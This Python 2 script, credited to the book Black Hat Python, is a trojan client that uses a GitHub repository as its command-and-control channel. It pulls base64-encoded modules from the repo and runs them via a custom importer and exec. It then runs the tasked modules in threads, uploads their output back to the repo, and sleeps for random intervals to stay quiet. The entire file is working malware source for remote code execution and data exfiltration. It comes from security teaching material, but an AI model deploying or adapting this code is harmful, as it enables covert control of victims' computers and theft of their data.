#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Code is from Black Hat Python
# https://www.nostarch.com/blackhatpython

# Botnet Command and Control (Also commonly known as a "c2") framework utilizing GitHub
# Download Python 2.7 x86 from here: https://www.python.org/ftp/python/2.7.12/python-2.7.12.msi

# Get pyHook from: https://sourceforge.net/projects/pyhook/
# Get pywin32 from: https://sourceforge.net/projects/pywin32/files/pywin32/Build%20220/pywin32-220.win32-py2.7.exe/download

import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

# pip install github3
from github3 import login

trojan_id = "abc"

# The following syntax with the "%" is similar to printf in C
trojan_config = "%s.json" % trojan_id
data_path = "data/%s/" % trojan_id
trojan_modules = []

task_queue = Queue.Queue()
configured = False


class GitImporter(object):
    """ Custom Python module importer """
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print "[*] Attempting to retrieve %s" % fullname
            new_library = get_file_contents("modules/%s" % fullname)
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None

    def load_module(self, name):
        module = imp.new_module(name)
        exec self.current_module_code in module.__dict__
        sys.modules[name] = module
        return module


def connect_to_github():
    """ Authenticates and Connects to the Github repo """

    # Authentication
    from os.path import isfile
    if isfile("github-logins.json"):
        with open("github-logins.json", "r") as loginfile:
            logins = json.load(loginfile)
            gh = login(username=logins["username"], password=logins["password"])
    else:
        from getpass import getpass
        password = getpass()
        gh = login(username="yourusername", password=password)

    # Connect to the repo
    repo = gh.repository("ghostofgoes", "botnet-example")
    branch = repo.branch("master")
    return gh, repo, branch


def get_file_contents(filepath):
    """ Gets the raw contents for a file on the repo. """
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()
    for filename in tree.tree:
        if filepath in filename.path:
            print "[*] Found file %s" % filepath
            blob = repo.blob(filename._json_data['sha'])
            return blob.content
    return None


def get_trojan_config():
    """ Finds and loads the configuration file from the repo.
    Imports any modules listed in the file. """
    global configured
    config_json = get_file_contents(trojan_config)
    conf = json.loads(base64.b64decode(config_json))
    configured = True
    for tsk in conf:
        if tsk['module'] not in sys.modules:
            exec ("import %s" % tsk['module'])
    return conf


def store_module_result(data):
    """ Uploads the results of a module run to the repo, in data/<trojan-id> """
    gh, repo, branch = connect_to_github()
    remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))
    repo.create_file(remote_path, "Commit message", base64.b64encode(data))
    return


def module_runner(module):
    """ Runs the module as thread, gets the result, and uploads to the repo. """
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()
    store_module_result(result)  # Store the result in our repo


# Add custom importer to the path Python uses to look for modules
sys.meta_path = [GitImporter()]

# Main trojan loop
while True:
    if task_queue.empty():
        config = get_trojan_config()
        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1, 10))
    time.sleep(random.randint(1000, 10000))
